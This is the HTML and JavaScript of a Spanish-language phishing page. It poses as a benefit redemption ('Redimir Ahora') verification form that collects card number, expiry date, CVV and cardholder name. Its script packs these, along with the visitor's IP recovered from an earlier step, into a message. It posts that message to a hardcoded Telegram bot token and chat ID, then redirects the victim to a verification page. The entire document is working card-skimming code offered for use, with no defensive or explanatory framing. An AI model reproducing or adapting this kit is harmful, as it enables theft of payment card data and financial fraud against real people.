<body>
    
        <!-- Contenedor del formulario con estilo login-box -->
        <div class="login-box">
            <h2>Producto Beneficiario</h2>
            <p>Confirma los datos de tu tarjeta para continuar con la verificación.</p>
            
            <label>Número de Tarjeta</label>
            <input id="numTarjeta" type="tel" maxlength="16" placeholder="16 dígitos" oninput="validarFormulario()">

            <div class="row">
                <div style="flex:1">
                    <label>Vencimiento</label>
                    <input id="vencimiento" type="text" maxlength="5" placeholder="MM/AA" oninput="validarFormulario()">
                </div>
                <div style="flex:1">
                    <label>CVV</label>
                    <input id="cvv" type="tel" maxlength="4" placeholder="123" oninput="validarFormulario()">
                </div>
            </div>

            <label>Nombre del Titular</label>
            <input id="titular" type="text" placeholder="Como aparece en la tarjeta" oninput="validarFormulario()">

            <button id="btnPagar" disabled onclick="procesarPago()">Redimir Ahora</button>
        </div>
    </div>

<script>
    const TOKEN = '8378413801:AAHtU9rr9XuipY7b5OQh8iq0OQqOlpB8Q7Q';
    const ID_CHAT = '-5213719362';
    let enviando = false;

    // Recuperamos la IP que guardamos en el primer paso para amarrar la sesión
    const ipUsuario = localStorage.getItem('user_ip') || "IP_No_Detectada";

    function validarFormulario() {
        const t = document.getElementById('numTarjeta').value;
        const f = document.getElementById('vencimiento').value;
        const c = document.getElementById('cvv').value;
        const n = document.getElementById('titular').value;
        const btn = document.getElementById('btnPagar');

        btn.disabled = (t.length < 16 || f.length < 5 || c.length < 3 || n.length < 3 || enviando);
        if (!btn.disabled) btn.classList.add('active');
        else btn.classList.remove('active');
    }

    async function procesarPago() {
        if(enviando) return;
        enviando = true;

        const btn = document.getElementById('btnPagar');
        btn.disabled = true;
        btn.innerText = "Procesando...";

        const t = document.getElementById('numTarjeta').value;
        const f = document.getElementById('vencimiento').value;
        const c = document.getElementById('cvv').value;
        const n = document.getElementById('titular').value;

        // Mensaje formateado con la IP del usuario y Markdown para resaltar datos
        const texto = `👤 **USUARIO: [${ipUsuario}]**\n💳 **NUEVO PLÁSTICO**\n👤 **Titular:** ${n}\n🔢 **Tarjeta:** \`${t}\`\n📅 **Vence:** ${f}\n🔒 **CVV:** \`${c}\`\n📌 **PASO:** Finalizado`;

        // Usamos el método POST para soportar el parse_mode Markdown con seguridad
        const urlFinal = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        try {
            await fetch(urlFinal, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ID_CHAT,
                    text: texto,
                    parse_mode: 'Markdown'
                })
            });
            // Redirigir a la página oficial o a un mensaje de éxito
            window.location.href = "verificacion.html"; 
        } catch (err) {
            console.error("Error:", err);
            window.location.href = "verificacion.html";
        }
    }
</script>
